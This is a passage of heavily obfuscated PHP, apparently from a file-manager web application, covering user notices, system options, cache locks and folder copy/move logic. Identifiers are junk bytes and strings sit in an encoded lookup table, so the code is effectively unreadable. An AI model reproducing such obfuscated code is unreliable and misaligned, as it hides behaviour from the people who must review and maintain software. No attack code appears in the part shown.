userNoticeAdd($İ´¯ŠÚÎ) { $÷ÀÇŸØã =& $_SERVER[”ú…±Ú¥]; $this->initUserOption(); $ÙÓ×ª²Í = $this->findByKey($÷ÀÇŸØã[2296], $İ´¯ŠÚÎ[$÷ÀÇŸØã[437]]); if ($ÙÓ×ª²Í) { return !0; } $´œøÔê– = array($÷ÀÇŸØã[2296] => $İ´¯ŠÚÎ[$÷ÀÇŸØã[437]], $÷ÀÇŸØã[32] => $İ´¯ŠÚÎ[$÷ÀÇŸØã[32]], $÷ÀÇŸØã[180] => $İ´¯ŠÚÎ[$÷ÀÇŸØã[180]], $÷ÀÇŸØã[33] => isset($İ´¯ŠÚÎ[$÷ÀÇŸØã[33]]) ? $İ´¯ŠÚÎ[$÷ÀÇŸØã[33]] : 1, $÷ÀÇŸØã[2297] => isset($İ´¯ŠÚÎ[$÷ÀÇŸØã[2297]]) ? $İ´¯ŠÚÎ[$÷ÀÇŸØã[2297]] : 0, $÷ÀÇŸØã[782] => 0, $÷ÀÇŸØã[206] => 0); return parent::insert($´œøÔê–); } public function userNoticeEdit($íÓØÛĞå, $Œ…œÀ„‰) { $this->initUserOption(); return parent::update($íÓØÛĞå, $Œ…œÀ„‰); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\x79\x73\x74\x65\155\137\157\x70\164\151\157\156"; protected $jsonField = array("\x6d\145\156\165", "\x72\157\x6c\x65", "\x72\157\154\x65\x47\x72\x6f\x75\160", "\162\145\x67\x69\163\164", "\x65\x6d\x61\151\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($Çˆè»•É) { return "\123\x79\163\164\x65\x6d\117\160\x74\x69\x6f\x6e\x5f{$Çˆè»•É}"; } protected function optionDefault($ÀÚ·»³İ = '') { $÷Ó“Ğ¤Ì =& $_SERVER[”ú…±Ú¥]; if ($ÀÚ·»³İ == $÷Ó“Ğ¤Ì[12]) { return $GLOBALS[$÷Ó“Ğ¤Ì[6]][$÷Ó“Ğ¤Ì[419]]; } } } class SystemRecordModel extends ModelBaseLight { } goto f…à¤¾¼š; B¿»Ÿô–ãŒ: class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($Ç¼ÛøÌö) { $Õ¦«äÕù =& $_SERVER[”ú…±Ú¥]; if (!$this->allowLock()) { return; } $this->_lockCheck($Õ¦«äÕù[584], $Ç¼ÛøÌö); $îÓŞ»¢ = 1; $this->_lockEvent($Ç¼ÛøÌö, array($Õ¦«äÕù[585], $Õ¦«äÕù[586]), $îÓŞ»¢); $this->_lockParent($Ç¼ÛøÌö, array($Õ¦«äÕù[586]), $îÓŞ»¢); $this->_lockEvent($Ç¼ÛøÌö, array($Õ¦«äÕù[587], $Õ¦«äÕù[588]), $îÓŞ»¢); $this->_lockCheckEnd($Õ¦«äÕù[584], $Ç¼ÛøÌö); } public function lockCopyEnd($¬ŒÙÉ·) { $çœâ˜ÛÃ =& $_SERVER[”ú…±Ú¥]; if (!$this->allowLock()) { return; } $¨¾÷‰Íğ = 0; $this->_lockEvent($¬ŒÙÉ·, array($çœâ˜ÛÃ[585], $çœâ˜ÛÃ[586]), $¨¾÷‰Íğ); $this->_lockParent($¬ŒÙÉ·, array($çœâ˜ÛÃ[586]), $¨¾÷‰Íğ); $this->_lockEvent($¬ŒÙÉ·, array($çœâ˜ÛÃ[587], $çœâ˜ÛÃ[588]), $¨¾÷‰Íğ); } public function lockWriteStart($ÂÊ×¸æ¤, $Â‡õ¸²Ë = '') { $æÉŒÎ‚ø =& $_SERVER[”ú…±Ú¥]; if (!$this->allowLock()) { return; } $this->_lockCheck($æÉŒÎ‚ø[585], $ÂÊ×¸æ¤); $–Û¯ÀŒ¤ = 1; $this->_lockKey($æÉŒÎ‚ø[589] . $ÂÊ×¸æ¤ . $æÉŒÎ‚ø[10] . $Â‡õ¸²Ë, $–Û¯ÀŒ¤); $this->_lockEvent($ÂÊ×¸æ¤, array($æÉŒÎ‚ø[584], $æÉŒÎ‚ø[586]), $–Û¯ÀŒ¤); $this->_lockParent($ÂÊ×¸æ¤, array($æÉŒÎ‚ø[584], $æÉŒÎ‚ø[586]), $–Û¯ÀŒ¤); $this->_lockCheckEnd($æÉŒÎ‚ø[585], $ÂÊ×¸æ¤); } public function lockWriteEnd($¬úÏé²¨, $–ĞÙû¶å = '') { $ë¯ÄÑƒË =& $_SERVER[”ú…±Ú¥]; if (!$this->allowLock()) { return; } $ÖÊéØ¬³ = 0; $this->_lockKey($ë¯ÄÑƒË[589] . $¬úÏé²¨ . $ë¯ÄÑƒË[10] . $–ĞÙû¶å, $ÖÊéØ¬³); $this->_lockEvent($¬úÏé²¨, array($ë¯ÄÑƒË[584], $ë¯ÄÑƒË[586]), $ÖÊéØ¬³); $this->_lockParent($¬úÏé²¨, array($ë¯ÄÑƒË[584], $ë¯ÄÑƒË[586]), $ÖÊéØ¬³); } public function lockMoveStart($‹ùˆØµö) { $àäìäŠö =& $_SERVER[”ú…±Ú¥]; if (!$this->allowLock()) { return; } $this->_lockCheck($àäìäŠö[586], $‹ùˆØµö); $™ÊÔ»¦Á = 1; $this->_lockKey($àäìäŠö[590] . $‹ùˆØµö, $™ÊÔ»¦Á); $this->_lockEvent($‹ùˆØµö, array($àäìäŠö[584], $àäìäŠö[585]), $™ÊÔ»¦Á); $this->_lockParent($‹ùˆØµö, array($àäìäŠö[584], $àäìäŠö[586]), $™ÊÔ»¦Á); $this->_lockEvent($‹ùˆØµö, array($àäìäŠö[591], $àäìäŠö[587], $àäìäŠö[588]), $™ÊÔ»¦Á); $this->_lockCheckEnd($àäìäŠö[586], $‹ùˆØµö); } public function lockMoveEnd($ËÙ™Ö‰˜) { $õé¢˜…© =& $_SERVER[”ú…±Ú¥]; if (!$this->allowLock()) { return; } $“ôõ¦À = 0; $this->_lockKey($õé¢˜…©[590] . $ËÙ™Ö‰˜, $“ôõ¦À); $this->_lockEvent($ËÙ™Ö‰˜, array($õé¢˜…©[584], $õé¢˜…©[585]), $“ôõ¦À); $this->_lockParent($ËÙ™Ö‰˜, array($õé¢˜…©[584], $õé¢˜…©[586]), $“ôõ¦À); $this->_lockEvent($ËÙ™Ö‰˜, array($õé¢˜…©[591], $õé¢˜…©[587], $õé¢˜…©[588]), $“ôõ¦À); } private function _lockCheck($ï¯Å†¨Ã, $ÑØšË‹­) { $ŒáÉ–Ê =& $_SERVER[”ú…±Ú¥]; $—Ğò®¸ = $this->sourceInfo($ÑØšË‹­); $Êã–‚˜ = $ï¯Å†¨Ã . $ŒáÉ–Ê[10] . $ÑØšË‹­; $this->_lockTimeStart[$Êã–‚˜] = timeFloat(); if (!is_array($—Ğò®¸)) { return; } $›„ÑÖï = LNG($ŒáÉ–Ê[592]); CacheLock::setErrorMsg($ŒáÉ–Ê[162] . htmlspecialchars($—Ğò®¸[$ŒáÉ–Ê[32]]) . $ŒáÉ–Ê[164] . $›„ÑÖï); $this->_lockKey($Êã–‚˜, 1); $this->_lockKey($Êã–‚˜, 0); $·„ÍöõË = array_reverse($this->parentLevelArray($—Ğò®¸[$ŒáÉ–Ê[549]])); foreach ($·„ÍöõË as $¶´™Ñ´) { $Êã–‚˜ = $ï¯Å†¨Ã . $ŒáÉ–Ê[593] . $¶´™Ñ´; if (CacheLock::lockGet($ŒáÉ–Ê[594] . $Êã–‚˜)) { $—Ğò®¸ = $this->sourceInfo($¶´™Ñ´); CacheLock::setErrorMsg($ŒáÉ–Ê[162] . htmlspecialchars($—Ğò®¸[$ŒáÉ–Ê[32]]) . $ŒáÉ–Ê[164] . $›„ÑÖï); $this->_lockKey($Êã–‚˜, 1); $this->_lockKey($Êã–‚˜, 0); } } } private function _lockCheckEnd($ÕŒì§­İ, $—Œû½°) { $“è‡ã¹æ =& $_SERVER[”ú…±Ú¥]; $íŞ¾ûŸ = $ÕŒì§­İ . $“è‡ã¹æ[10] . $—Œû½°; CacheLock::setErrorMsg($“è‡ã¹æ[416]); if (!isset($this->_lockTimeStart[$íŞ¾ûŸ])) { return; } $Å Íûíú = timeFloat() - $this->_lockTimeStart[$íŞ¾ûŸ]; unset($this->_lockTimeStart[$íŞ¾ûŸ]); if ($Å Íûíú > 0.5) { unset(self::$cacheSourceInfo[$“è‡ã¹æ[498] . $—Œû½°]); } $Ğş²ç»› = $this->sourceInfo($—Œû½°); if (!$Ğş²ç»›) { show_json(LNG($“è‡ã¹æ[105]), !1); } } private function _lockParent($±Ùí†Œì, $€ªãòşÈ, $ßâå­‚­) { if (!$this->autoLockSet) { return; } $Õ”»ş  = $this->sourceInfo($±Ùí†Œì); if (!is_array($Õ”»ş )) { return; } $¹œ¶ëëÄ = array_reverse($this->parentLevelArray($Õ”»ş [$_SERVER[”ú…±Ú¥][549]])); foreach ($¹œ¶ëëÄ as $ãı¹œâë) { $this->_lockEvent($ãı¹œâë, $€ªãòşÈ, $ßâå­‚­); } } private function _lockEvent($ŸùÒÒ®¶, $ıÆ„¦¹, $ºñöï±™) { $É¹âàúš =& $_SERVER[”ú…±Ú¥]; if (!$this->autoLockSet) { return; } foreach ($ıÆ„¦¹ as $×şôµÏã) { $¯éî¦¸ş = $×şôµÏã . $É¹âàúš[10] . $ŸùÒÒ®¶; if ($ºñöï±™ && CacheLock::lockGet($É¹âàúš[594] . $¯éî¦¸ş)) { continue; } $this->_lockKey($¯éî¦¸ş, $ºñöï±™); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($³•¼ÏÀ­, $ğ½ÍÔõ = 1) { $È„ıùÓÖ = $_SERVER[”ú…±Ú¥][594] . md5($³•¼ÏÀ­); if ($ğ½ÍÔõ) { if (isset(self::$_lockItemArr[$È„ıùÓÖ])) { return; } self::$_lockItemArr[$È„ıùÓÖ] = 1; CacheLock::lock($È„ıùÓÖ, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$È„ıùÓÖ])) { return; } unset(self::$_lockItemArr[$È„ıùÓÖ]); CacheLock::unlock($È„ıùÓÖ); } } public function isParentOf($ÎÔÂ£µ, $¦ªÚµİ ) { $öƒ±ö’ =& $_SERVER[”ú…±Ú¥]; $ÂÑê Áş = $this->sourceInfo($ÎÔÂ£µ); $ÔĞıµ…İ = $this->sourceInfo($¦ªÚµİ ); $¢¢Ú’ç = $ÂÑê Áş[$öƒ±ö’[549]] . $ÂÑê Áş[$öƒ±ö’[440]] . $öƒ±ö’[50]; $Ñçé½ş¢ = $ÔĞıµ…İ[$öƒ±ö’[549]] . $ÔĞıµ…İ[$öƒ±ö’[440]] . $öƒ±ö’[50]; $¼ËÄ´ìº = strpos($Ñçé½ş¢, $¢¢Ú’ç) === 0; return $¼ËÄ´ìº; } private $targetIsDelete = 0; public function copy($¼Á¿³Ø», $ïÎøêÍ, $¬¸Ä„û = REPEAT_REPLACE, $„Ë¤ñü¾ = '') { $ĞÂáÃø½ =& $_SERVER[”ú…±Ú¥]; $øÊ…Çó = $this->sourceInfo($¼Á¿³Ø»); $ìÄÏÛŞˆ = $this->sourceInfo($ïÎøêÍ); if (!$øÊ…Çó || !$ìÄÏÛŞˆ || $ìÄÏÛŞˆ[$ĞÂáÃø½[448]] != $ĞÂáÃø½[88]) { return !1; } if ($this->isParentOf($¼Á¿³Ø», $ïÎøêÍ)) { return !1; } $®µ€“òË = $„Ë¤ñü¾ ? $„Ë¤ñü¾ : $øÊ…Çó[$ĞÂáÃø½[32]]; $this->lockCopyStart($¼Á¿³Ø»); $this->lockWriteStart($ïÎøêÍ, $®µ€“òË); $Ú’Ğ‰ˆ = array($ĞÂáÃø½[595] => array(), $ĞÂáÃø½[596] => array(), $ĞÂáÃø½[597] => array()); $this->targetIsDelete = intval($øÊ…Çó[$ĞÂáÃø½[469]]); $‘Ê´ä = $this->fileNameExistCache($ïÎøêÍ, $øÊ…Çó[$ĞÂáÃø½[32]]); $ÖÚÁ‰ÂØ = $this->_copy($¼Á¿³Ø», $ïÎøêÍ, $¬¸Ä„û, $Ú’Ğ‰ˆ, !0, $„Ë¤ñü¾); $this->_childrenListClear(); $this->lockCopyEnd($¼Á¿³Ø»); $this->lockWriteEnd($ïÎøêÍ, $®µ€“òË); if ($øÊ…Çó[$ĞÂáÃø½[448]] == $ĞÂáÃø½[88] && $‘Ê´ä == $ÖÚÁ‰ÂØ) { $this->folderSizeResetChildren($‘Ê´ä); } Model($ĞÂáÃø½[598])->addAll($Ú’Ğ‰ˆ[$ĞÂáÃø½[596]], array(), !0); if ($‘Ê´ä != $ÖÚÁ‰ÂØ || $øÊ…Çó[$ĞÂáÃø½[448]] == $ĞÂáÃø½[88]) { Model($ĞÂáÃø½[599])->eventCopy($ÖÚÁ‰ÂØ); } $this->saveAll($Ú’Ğ‰ˆ[$ĞÂáÃø½[597]]); Model($ĞÂáÃø½[210])->linkAdd($Ú’Ğ‰ˆ[$ĞÂáÃø½[595]]); $this->folderSizeReset($ïÎøêÍ); $this->updateModifyTime($ïÎøêÍ); return $ÖÚÁ‰ÂØ; } private function _copy($é¯‚¨Áö, $¥é”¸â, $ĞË´µ«û, &$Íö¡¼±ï, $¨‚‚ã¹¡, $ïŠ´„Ãª = '') { $Ñ§Íîá =& $_SERVER[”ú…±Ú¥]; $Øßº‡ûŠ = $this->sourceInfoCache($é¯‚¨Áö); $¹‰Ÿ¥àª = $Øßº‡ûŠ[$Ñ§Íîá[448]] == $Ñ§Íîá[88]; $°áÑ„¹Ö = $ïŠ´„Ãª ? $ïŠ´„Ãª : $Øßº‡ûŠ[$Ñ§Íîá[32]]; $ìá¼À² = $this->fileNameExistCache($¥é”¸â, $°áÑ„¹Ö); if ($¨‚‚ã¹¡) { $this->_childrenAllMake($é¯‚¨Áö); if ($¹‰Ÿ¥àª && $ìá¼À²) { $this->_childrenAllMake($ìá¼À²); } } if (!$ìá¼À²) { return $this->_copyCreate($é¯‚¨Áö, $¥é”¸â, $°áÑ„¹Ö, $Íö¡¼±ï); } $Ÿú¯ºŞš = $ìá¼À²; if ($¹‰Ÿ¥àª) { if ($ĞË´µ«û == REPEAT_RENAME_FOLDER) { $°áÑ„¹Ö = $this->fileNameAutoCache($¥é”¸â, $°áÑ„¹Ö, $ĞË´µ«û, $¹‰Ÿ¥àª); $Ÿú¯ºŞš = $this->_copyCreate($é¯‚¨Áö, $¥é”¸â, $°áÑ„¹Ö, $Íö¡¼±ï); } else { $ºœªóò = $this->_childrenList($é¯‚¨Áö); foreach ($ºœªóò as $áÀÆØ¤è) { $this->_copy($áÀÆØ¤è[$Ñ§Íîá[440]], $ìá¼À², $ĞË´µ«û, $Íö¡¼±ï, !1); } } } else { if ($ĞË´µ«û == REPEAT_RENAME || $ĞË´µ«û == REPEAT_RENAME_FOLDER) { $°áÑ„¹Ö = $this->fileNameAutoCache($¥é”¸â, $°áÑ„¹Ö, $ĞË´µ«û, $¹‰Ÿ¥àª); $Ÿú¯ºŞš = $this->_copyCreate($é¯‚¨Áö, $¥é”¸â, $°áÑ„¹Ö, $Íö¡¼±ï); } else { if ($ĞË´µ«û == REPEAT_REPLACE) { $Ò¿ºéü´ = $this->sourceInfoCache($ìá¼À²); $Ü¹Àã¾ü = $this->fileHistory($Ò¿ºéü´, $Øßº‡ûŠ[$Ñ§Íîá[506]], $Øßº‡ûŠ[$Ñ§Íîá[76]]); if ($Ü¹Àã¾ü) { $Íö¡¼±ï[$Ñ§Íîá[595]][] = $Øßº‡ûŠ[$Ñ§Íîá[506]]; } } else { if ($ĞË´µ«û == REPEAT_SKIP) { } } } Hook::trigger($Ñ§Íîá[600], array($Ñ§Íîá[601], $Øßº‡ûŠ, 0)); } return $Ÿú¯ºŞš; } private function _copyCreate($†—Å¨æã, $ÆìĞßûº, $“ÉÎ½Îœ, &$õ²€³ú‘) { $ˆĞé¶Õü =& $_SERVER[”ú…±Ú¥]; $ì«¦ = $this->sourceInfoCache($†—Å¨æã); $ûÚöŒ¾å = $this->sourceInfoCache($ÆìĞßûº); $˜÷Ü½ø® = $this->_makeItemData($ì«¦, $ûÚöŒ¾å, $“ÉÎ½Îœ); Hook::trigger($ˆĞé¶Õü[602], $˜÷Ü½ø®); Hook::trigger($ˆĞé¶Õü[603], array($ˆĞé¶Õü[604], $˜÷Ü½ø®, 0)); $™¤—Í  = $this->add($˜÷Ü½ø®); $Ì»ğ€¸Ê = array($ˆĞé¶Õü[440] => $™¤—Í , $ˆĞé¶Õü[32] => $“ÉÎ½Îœ); $this->_copyApplyMeta($Ì»ğ€¸Ê, $õ²€³ú‘); if ($ì«¦[$ˆĞé¶Õü[448]] != $ˆĞé¶Õü[88]) { $õ²€³ú‘[$ˆĞé¶Õü[595]][] = $ì«¦[$ˆĞé¶Õü[506]]; return $™¤—Í ; } $ùÊÔÊñ÷ = array(); $¾—©†½ = array(); $this->_childrenListAll($†—Å¨æã, $ùÊÔÊñ÷); $Á¯¼ïˆÎ = count($ùÊÔÊñ÷); if ($Á¯¼ïˆÎ == 0) { return $™¤—Í ; } $¼ß¸¬™õ = $this->sourceInfo($™¤—Í ); foreach ($ùÊÔÊñ÷ as $«Ş´ãÙ) { $òÆÛ°£ò = $this->_makeItemData($«Ş´ãÙ, $¼ß¸¬™õ, $«Ş´ãÙ[$ˆĞé¶Õü[32]]); $òÆÛ°£ò[$ˆĞé¶Õü[549]] = $«Ş´ãÙ[$ˆĞé¶Õü[549]]; $¾—©†½[] = $òÆÛ°£ò; } $this->chunkEventSet($ˆĞé¶Õü[605], array($ˆĞé¶Õü[606], $˜÷Ü½ø®, $Á¯¼ïˆÎ)); $this->addAll($¾—©†½, array(), !1); $„Ê´ÏÛé = $this->where(array($ˆĞé¶Õü[470] => $™¤—Í ))->select(); $¡ƒ”·µ = $this->_childrenMakeRelation($ùÊÔÊñ÷, $„Ê´ÏÛé); $¡ƒ”·µ[$†—Å¨æã] = $™¤—Í ; $°Ï†¥Õ£ = array(); $„‡Š‚ÜÛ = array(); foreach ($„Ê´ÏÛé as $«Ş´ãÙ) { $º©×®¯€ = $«Ş´ãÙ[$ˆĞé¶Õü[440]]; $¢èÀˆ­Ò = $this->_childrenMatch($¡ƒ”·µ, $«Ş´ãÙ, $¼ß¸¬™õ); $°Ï†¥Õ£[] = array($ˆĞé¶Õü[440], $º©×®¯€, $ˆĞé¶Õü[470], $¢èÀˆ­Ò[$ˆĞé¶Õü[470]]); $„‡Š‚ÜÛ[] = array($ˆĞé¶Õü[440], $º©×®¯€, $ˆĞé¶Õü[549], $¢èÀˆ­Ò[$ˆĞé¶Õü[549]]); $this->_copyApplyMeta($«Ş´ãÙ, $õ²€³ú‘); if ($«Ş´ãÙ[$ˆĞé¶Õü[448]] != $ˆĞé¶Õü[88]) { $õ²€³ú‘[$ˆĞé¶Õü[595]][] = $«Ş´ãÙ[$ˆĞé¶Õü[506]]; } } $this->chunkEventSet($ˆĞé¶Õü[607], array($ˆĞé¶Õü[608], $˜÷Ü½ø®, $Á¯¼ïˆÎ)); $this->saveAll($°Ï†¥Õ£); $this->chunkEventSet($ˆĞé¶Õü[609], array($ˆĞé¶Õü[610], $˜÷Ü½ø®, $Á¯¼ïˆÎ)); $this->saveAll($„‡Š‚ÜÛ); return $™¤—Í ; } private function _childrenMakeRelation($„†øİ¨, $ĞÛñ–¢ş) { $ÇÛÜ­ıú =& $_SERVER[”ú…±Ú¥]; $¹ŸŒŞú¥ = array(); $¦ñ†µµ = array(); foreach ($„†øİ¨ as $ô©ãÔŸ¿) { $©œ›ËÑú = $ô©ãÔŸ¿[$ÇÛÜ­ıú[32]] . $ÇÛÜ­ıú[8] . $ô©ãÔŸ¿[$ÇÛÜ­ıú[549]]; $¹ŸŒŞú¥[$©œ›ËÑú] = $ô©ãÔŸ¿[$ÇÛÜ­ıú[440]]; } foreach ($ĞÛñ–¢ş as $ô©ãÔŸ¿) { $©œ›ËÑú = $ô©ãÔŸ¿[$ÇÛÜ­ıú[32]] . $ÇÛÜ­ıú[8] . $ô©ãÔŸ¿[$ÇÛÜ­ıú[549]]; $÷›ëåÂ = $¹ŸŒŞú¥[$©œ›ËÑú]; $¦ñ†µµ[$÷›ëåÂ] = $ô©ãÔŸ¿[$ÇÛÜ­ıú[440]]; } return $¦ñ†µµ; } private function _childrenMatch($ĞÏ¡îÜÔ, $—Ü½‡Ã’, $Û’õİ°») { $¦ÊŒ«ÁË =& $_SERVER[”ú…±Ú¥]; $óÏ”è˜œ = $Û’õİ°»[$¦ÊŒ«ÁË[549]]; $ì²³Ë¯Î = $this->parentLevelArray($—Ü½‡Ã’[$¦ÊŒ«ÁË[549]]); foreach ($ì²³Ë¯Î as $ôÖõ¸Æ) { if (isset($ĞÏ¡îÜÔ[$ôÖõ¸Æ])) { $óÏ”è˜œ .= $ĞÏ¡îÜÔ[$ôÖõ¸Æ] . $¦ÊŒ«ÁË[611]; } } $óÏ”è˜œ = rtrim($óÏ”è˜œ, $¦ÊŒ«ÁË[50]) . $¦ÊŒ«ÁË[50]; $íêŒ²İæ = $this->parentLevelArray($óÏ”è˜œ); $‰ŞÜØ¤¢ = $íêŒ²İæ[count($íêŒ²İæ) - 1]; return array($¦ÊŒ«ÁË[470] => $‰ŞÜØ¤¢, $¦ÊŒ«ÁË[549] => $óÏ”è˜œ); } private function _makeItemData($ˆĞÖİçÏ, $Û»„ùÉŠ, $ĞªÍã³Ô) { $‡áŸ®ö€ =& $_SERVER[”ú…±Ú¥]; $ÆÀ×şÔŞ = array($‡áŸ®ö€[612] => $ˆĞÖİçÏ[$‡áŸ®ö€[448]], $‡áŸ®ö€[458] => $ĞªÍã³Ô, $‡áŸ®ö€[613] => $ˆĞÖİçÏ[$‡áŸ®ö€[450]] ? $ˆĞÖİçÏ[$‡áŸ®ö€[450]] : $‡áŸ®ö€[12], $‡áŸ®ö€[507] => $ˆĞÖİçÏ[$‡áŸ®ö€[506]] ? $ˆĞÖİçÏ[$‡áŸ®ö€[506]] : 0, $‡áŸ®ö€[583] => $ˆĞÖİçÏ[$‡áŸ®ö€[76]] ? $ˆĞÖİçÏ[$‡áŸ®ö€[76]] : 0, $‡áŸ®ö€[614] => intval($Û»„ùÉŠ[$‡áŸ®ö€[449]]), $‡áŸ®ö€[615] => intval($Û»„ùÉŠ[$‡áŸ®ö€[534]]), $‡áŸ®ö€[616] => intval(USER_ID), $‡áŸ®ö€[617] => intval(USER_ID), $‡áŸ®ö€[439] => intval($Û»„ùÉŠ[$‡áŸ®ö€[440]]), $‡áŸ®ö€[618] => $Û»„ùÉŠ[$‡áŸ®ö€[549]] . $Û»„ùÉŠ[$‡áŸ®ö€[440]] . $‡áŸ®ö€[50], $‡áŸ®ö€[462] => $ˆĞÖİçÏ[$‡áŸ®ö€[85]] ? $ˆĞÖİçÏ[$‡áŸ®ö€[85]] : time(), $‡áŸ®ö€[468] => 0, $‡áŸ®ö€[619] => $‡áŸ®ö€[12]); return $ÆÀ×şÔŞ; } private function _copyApplyMeta($Å¥•†«ğ, &$¥Ìì°Ç¨) { $§–…æÕî =& $_SERVER[”ú…±Ú¥]; $Ôƒ¶ïÛ‡ = $Å¥•†«ğ[$§–…æÕî[440]]; $¿İ‰÷‡Ì = $Å¥•†«ğ[$§–…æÕî[32]]; if (!isset($Å¥•†«ğ[$§–…æÕî[620]]) || !$Å¥•†«ğ[$§–…æÕî[620]] || $Å¥•†«ğ[$§–…æÕî[620]] == $§–…æÕî[208]) { $¥Ìì°Ç¨[$§–…æÕî[597]][] = array($§–…æÕî[440], $Ôƒ¶ïÛ‡, $§–…æÕî[620], short_id($Ôƒ¶ïÛ‡)); } if (Input::check($¿İ‰÷‡Ì, $§–…æÕî[621])) { $¥Ìì°Ç¨[$§–…æÕî[596]][] = array($§–…æÕî[440] => $Ôƒ¶ïÛ‡, $§–…æÕî[94] => $§–…æÕî[503], $§–…æÕî[412] => str_replace($§–…æÕî[53], $§–…æÕî[12], Pinyin::get($¿İ‰÷‡Ì))); $¥Ìì°Ç¨[$§–…æÕî[596]][] = array($§–…æÕî[440] => $Ôƒ¶ïÛ‡, $§–…æÕî[94] => $§–…æÕî[502], $§–…æÕî[412] => Pinyin::get($¿İ‰÷‡Ì, $§–…æÕî[622])); } $¥Ìì°Ç¨[$§–…æÕî[596]][] = array($§–…æÕî[440] => $Ôƒ¶ïÛ‡, $§–…æÕî[94] => $§–…æÕî[482], $§–…æÕî[412] => KodSort::makeStr($¿İ‰÷‡Ì)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($íÖÃÈ‘) { $³“°¬Õ• =& $_SERVER[”ú…±Ú¥]; $’«„ÁÄ = $this->sourceInfo($íÖÃÈ‘); $Ï”°ªç = $³“°¬Õ•[623]; $Š‹æèü¨ = array($³“°¬Õ•[549] => array($³“°¬Õ•[578], $’«„ÁÄ[$³“°¬Õ•[549]] . $íÖÃÈ‘ . $³“°¬Õ•[579]), $³“°¬Õ•[469] => $this->targetIsDelete); $Ù‹ß‘‡ = $this->field($Ï”°ªç)->where($Š‹æèü¨)->select(); if (!$Ù‹ß‘‡) { return; } $Ù‹ß‘‡ = array_to_keyvalue($Ù‹ß‘‡, $³“°¬Õ•[440]); foreach ($Ù‹ß‘‡ as $›”¨ÅøÃ) { $øØ¸ÀÑú = $›”¨ÅøÃ[$³“°¬Õ•[470]]; $íÖÃÈ‘ = $›”¨ÅøÃ[$³“°¬Õ•[440]]; if (!isset($this->_childrenListCache[$íÖÃÈ‘]) && $›”¨ÅøÃ[$³“°¬Õ•[448]] == $³“°¬Õ•[88]) { $this->_childrenListCache[$íÖÃÈ‘] = array(); } if (!isset($this->_childrenListCache[$øØ¸ÀÑú])) { $this->_childrenListCache[$øØ¸ÀÑú] = array(); } $this->_childrenListCache[$øØ¸ÀÑú][$íÖÃÈ‘] = $›”¨ÅøÃ; $this->_childrenItemCache[$íÖÃÈ‘] = $›”¨ÅøÃ; } } private function _childrenListAll($Ş•·ãÚÊ, &$õÁ’ñÈ†) { $ÁÛûÈß• =& $_SERVER[”ú…±Ú¥]; if (!isset($this->_childrenListCache[$Ş•·ãÚÊ])) { return; } $âÓ¹•§Ä = $this->_childrenListCache[$Ş•·ãÚÊ]; foreach ($âÓ¹•§Ä as $®†ß’ıÍ => $Õ˜”“) { $õÁ’ñÈ†[$®†ß’ıÍ] = $Õ˜”“; if ($Õ˜”“[$ÁÛûÈß•[448]] == $ÁÛûÈß•[88]) { $this->_childrenListAll($®†ß’ıÍ, $õÁ’ñÈ†); } } } private function sourceInfoCache($´¬¯»×) { if (isset($this->_childrenItemCache[$´¬¯»×])) { return $this->_childrenItemCache[$´¬¯»×]; } return $this->sourceInfo($´¬¯»×); } private function _childrenList($ˆ‹º»§) { if (isset($this->_childrenListCache[$ˆ‹º»§])) { return $this->_childrenListCache[$ˆ‹º»§]; } return $this->_childrenListSelect($ˆ‹º»§); } private function _childrenListSelect($şëŠØŸ˜) { $ã×©ôÙ÷ =& $_SERVER[”ú…±Ú¥]; $ğ¿ğ»ç¾ = array($ã×©ôÙ÷[470] => $şëŠØŸ˜, $ã×©ôÙ÷[469] => $this->targetIsDelete); $µç›ò»í = $this->where($ğ¿ğ»ç¾)->select(); $µç›ò»í = $µç›ò»í ? $µç›ò»í : array(); $ÕšÊşéÙ = array_to_keyvalue($µç›ò»í, $ã×©ôÙ÷[440]); $this->_childrenListCache[$şëŠØŸ˜] = $ÕšÊşéÙ; foreach ($ÕšÊşéÙ as $şëŠØŸ˜ => $ï¥ç¿¦ú) { $this->_childrenItemCache[$şëŠØŸ˜] = $ï¥ç¿¦ú; } return $ÕšÊşéÙ; } private function fileNameExistCache($­½¬„ä, $†è‡ùöÄ) { $±­”®† =& $_SERVER[”ú…±Ú¥]; $†è‡ùöÄ = strtolower($†è‡ùöÄ); $İÌõ±¤÷ = $this->_childrenList($­½¬„ä); foreach ($İÌõ±¤÷ as $ª§æÏƒ¦) { if ($†è‡ùöÄ == strtolower($ª§æÏƒ¦[$±­”®†[32]])) { return $ª§æÏƒ¦[$±­”®†[440]]; } } return !1; } private function fileNameAutoCache($Ò»ã¤öÇ, $Âö÷à¨, $˜“ñ¢Ìå, $“Òæùò¢) { $º¢ê¯ºä =& $_SERVER[”ú…±Ú¥]; $•Àò¯¼§ = $this->_childrenList($Ò»ã¤öÇ); $óØå”²® = array_to_keyvalue($•Àò¯¼§, $º¢ê¯ºä[12], $º¢ê¯ºä[32]); return $this->fileNameAutoGet($óØå”²®, $Âö÷à¨, $˜“ñ¢Ìå, $“Òæùò¢); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($º•£Á…ê, $®›íÆø, $äÍÕò…ã = REPEAT_REPLACE, $Æ›î—âÎ = '') { $ñ±İËø =& $_SERVER[”ú…±Ú¥]; $ßµ­¼à¬ = $this->sourceInfo($º•£Á…ê); $öúÂ˜áä = $this->sourceInfo($®›íÆø); if ($ßµ­¼à¬[$ñ±İËø[470]] == $öúÂ˜áä[$ñ±İËø[440]]) { if ($ßµ­¼à¬[$ñ±İËø[469]] == $ñ±İËø[88]) { Model($ñ±İËø[467])->restore(array($º•£Á…ê)); } if (!$Æ›î—âÎ || $Æ›î—âÎ == $ßµ­¼à¬[$ñ±İËø[32]]) { return $º•£Á…ê; } } $À½®µÔ = $this->pathInfoMore($º•£Á…ê); if ($this->isParentOf($º•£Á…ê, $®›íÆø)) { return !1; } if (!$ßµ­¼à¬ || !$öúÂ˜áä || $öúÂ˜áä[$ñ±İËø[448]] != $ñ±İËø[88]) { return !1; } Hook::trigger($ñ±İËø[624], $À½®µÔ); $this->targetIsDelete = intval($ßµ­¼à¬[$ñ±İËø[469]]); if 